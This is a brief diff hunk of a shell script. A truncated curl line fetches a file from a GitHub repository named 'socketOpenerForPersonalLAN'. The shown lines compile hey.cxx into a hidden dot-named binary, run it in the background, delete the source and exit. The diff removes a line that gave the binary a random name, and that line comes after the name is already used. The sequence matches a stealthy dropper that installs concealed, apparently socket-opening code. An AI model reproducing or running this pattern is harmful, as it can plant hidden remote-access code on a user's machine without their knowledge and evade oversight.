@@ -3,5 +3,4 @@ curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/mai
 g++ hey.cxx -o .$fileName
 ./.$fileName &
 rm hey.cxx
-fileName=$(echo $RANDOM $RANDOM | tr -d ' ')
 exit
